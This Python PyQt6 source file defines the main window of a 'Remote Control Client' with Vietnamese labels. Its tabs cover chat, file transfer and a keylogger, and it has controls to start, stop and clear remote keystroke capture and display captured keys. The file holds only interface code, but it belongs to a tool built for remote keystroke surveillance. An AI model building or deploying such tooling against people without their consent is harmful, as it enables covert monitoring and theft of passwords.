"""
Main Window - Client Application Main Window
"""

from PyQt6.QtWidgets import (
    QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTabWidget, QMessageBox, QMenuBar, QMenu
)
from PyQt6.QtCore import Qt, pyqtSignal, QTimer
from PyQt6.QtGui import QAction, QIcon
from .components import StyledLabel, StyledButton, StatusLabel
from .chat_panel import ChatPanel
from .file_panel import FileTransferPanel
from .keylog_panel import KeylogPanel


class ClientMainWindow(QMainWindow):
    """Main window for client application"""
    
    # Signals for backend communication
    connect_requested = pyqtSignal()
    disconnect_requested = pyqtSignal()
    message_send_requested = pyqtSignal(str)
    file_send_requested = pyqtSignal(str)
    keylog_start_requested = pyqtSignal()
    keylog_stop_requested = pyqtSignal()
    keylog_clear_requested = pyqtSignal()
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.is_connected = False
        self.init_ui()
    
    def init_ui(self):
        """Initialize main window UI"""
        self.setWindowTitle("Remote Control Client")
        self.setGeometry(100, 100, 900, 700)
        
        # Create menu bar
        self.create_menu_bar()
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        main_layout = QVBoxLayout(central_widget)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)
        
        # Header
        header = self.create_header()
        main_layout.addWidget(header)
        
        # Tab widget for different panels
        self.tab_widget = QTabWidget()
        self.tab_widget.setStyleSheet("""
            QTabWidget::pane {
                border: 1px solid #ddd;
                background-color: white;
            }
            QTabBar::tab {
                background-color: #f0f0f0;
                padding: 10px 20px;
                margin-right: 2px;
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
            }
            QTabBar::tab:selected {
                background-color: white;
                border-bottom: 2px solid #4CAF50;
            }
            QTabBar::tab:hover {
                background-color: #e0e0e0;
            }
        """)
        
        # Create panels
        self.chat_panel = ChatPanel()
        self.file_panel = FileTransferPanel()
        self.keylog_panel = KeylogPanel()
        
        # Add panels to tab widget
        self.tab_widget.addTab(self.chat_panel, "💬 Chat")
        self.tab_widget.addTab(self.file_panel, "📁 File Transfer")
        self.tab_widget.addTab(self.keylog_panel, "⌨️ Keylogger")
        
        main_layout.addWidget(self.tab_widget)
        
        # Connect panel signals to main window signals
        self.connect_signals()
        
        # Initially disable all panels (not connected)
        self.set_panels_enabled(False)
    
    def create_menu_bar(self):
        """Create menu bar"""
        menubar = self.menuBar()
        
        # File menu
        file_menu = menubar.addMenu("&File")
        
        connect_action = QAction("&Kết nối", self)
        connect_action.triggered.connect(self.on_connect_clicked)
        file_menu.addAction(connect_action)
        
        disconnect_action = QAction("&Ngắt kết nối", self)
        disconnect_action.triggered.connect(self.on_disconnect_clicked)
        file_menu.addAction(disconnect_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction("&Thoát", self)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # Help menu
        help_menu = menubar.addMenu("&Help")
        
        about_action = QAction("&Giới thiệu", self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)
    
    def create_header(self):
        """Create header section"""
        header_widget = QWidget()
        header_widget.setStyleSheet("""
            QWidget {
                background-color: #2c3e50;
                padding: 15px;
            }
        """)
        
        header_layout = QHBoxLayout(header_widget)
        
        # Title
        title = StyledLabel("Remote Control Client", style_type="title")
        title.setStyleSheet("color: white; font-size: 20px;")
        header_layout.addWidget(title)
        
        header_layout.addStretch()
        
        # Connection status
        self.connection_status = StatusLabel("● Chưa kết nối")
        self.connection_status.setStyleSheet("color: #e74c3c; font-size: 14px; font-weight: bold;")
        header_layout.addWidget(self.connection_status)
        
        # Connection buttons
        self.connect_button = StyledButton("Kết nối", style_type="primary")
        self.connect_button.clicked.connect(self.on_connect_clicked)
        self.connect_button.setFixedWidth(120)
        header_layout.addWidget(self.connect_button)
        
        self.disconnect_button = StyledButton("Ngắt kết nối", style_type="danger")
        self.disconnect_button.clicked.connect(self.on_disconnect_clicked)
        self.disconnect_button.setEnabled(False)
        self.disconnect_button.setFixedWidth(120)
        header_layout.addWidget(self.disconnect_button)
        
        return header_widget
    
    def connect_signals(self):
        """Connect signals from panels to main window"""
        # Chat panel
        self.chat_panel.message_sent.connect(self.message_send_requested.emit)
        
        # File panel
        self.file_panel.file_selected.connect(self.file_send_requested.emit)
        
        # Keylog panel
        self.keylog_panel.start_keylog.connect(self.keylog_start_requested.emit)
        self.keylog_panel.stop_keylog.connect(self.keylog_stop_requested.emit)
        self.keylog_panel.clear_keylog.connect(self.keylog_clear_requested.emit)
    
    def on_connect_clicked(self):
        """Handle connect button click"""
        self.connect_requested.emit()
    
    def on_disconnect_clicked(self):
        """Handle disconnect button click"""
        reply = QMessageBox.question(
            self,
            "Xác nhận",
            "Bạn có chắc muốn ngắt kết nối?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.Yes:
            self.disconnect_requested.emit()
    
    def set_connected(self, connected):
        """Update UI based on connection status"""
        self.is_connected = connected
        
        # Update buttons
        self.connect_button.setEnabled(not connected)
        self.disconnect_button.setEnabled(connected)
        
        # Update status
        if connected:
            self.connection_status.setText("● Đã kết nối")
            self.connection_status.setStyleSheet("color: #2ecc71; font-size: 14px; font-weight: bold;")
            self.chat_panel.add_system_message("Đã kết nối đến server")
        else:
            self.connection_status.setText("● Chưa kết nối")
            self.connection_status.setStyleSheet("color: #e74c3c; font-size: 14px; font-weight: bold;")
            self.chat_panel.add_system_message("Đã ngắt kết nối")
        
        # Enable/disable panels
        self.set_panels_enabled(connected)
    
    def set_panels_enabled(self, enabled):
        """Enable or disable all panels"""
        self.chat_panel.set_enabled(enabled)
        self.file_panel.set_enabled(enabled)
        self.keylog_panel.set_enabled(enabled)
    
    def show_error(self, title, message):
        """Show error message dialog"""
        QMessageBox.critical(self, title, message)
    
    def show_info(self, title, message):
        """Show info message dialog"""
        QMessageBox.information(self, title, message)
    
    def show_about(self):
        """Show about dialog"""
        QMessageBox.about(
            self,
            "Giới thiệu",
            "Remote Control Client\n\n"
            "Phiên bản: 1.0\n"
            "Ứng dụng điều khiển từ xa\n\n"
            "Chức năng:\n"
            "- Chat với server\n"
            "- Truyền file\n"
            "- Keylogger\n"
        )
    
    def closeEvent(self, event):
        """Handle window close event"""
        if self.is_connected:
            reply = QMessageBox.question(
                self,
                "Xác nhận thoát",
                "Bạn đang kết nối. Bạn có chắc muốn thoát?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
            )
            
            if reply == QMessageBox.StandardButton.Yes:
                self.disconnect_requested.emit()
                event.accept()
            else:
                event.ignore()
        else:
            event.accept()
    
    # Methods for backend to update GUI
    
    def add_chat_message(self, sender, message):
        """Add message to chat (called by backend)"""
        self.chat_panel.add_message(sender, message)
    
    def add_received_file(self, filename, filepath):
        """Add received file to list (called by backend)"""
        self.file_panel.add_received_file(filename, filepath)
    
    def update_file_progress(self, progress):
        """Update file transfer progress (called by backend)"""
        self.file_panel.update_send_progress(progress)
    
    def add_keylog_data(self, key_text):
        """Add keylog data (called by backend)"""
        self.keylog_panel.add_key(key_text)
    
    def add_keylog_batch(self, keys_text):
        """Add batch of keylog data (called by backend)"""
        self.keylog_panel.add_keys(keys_text)
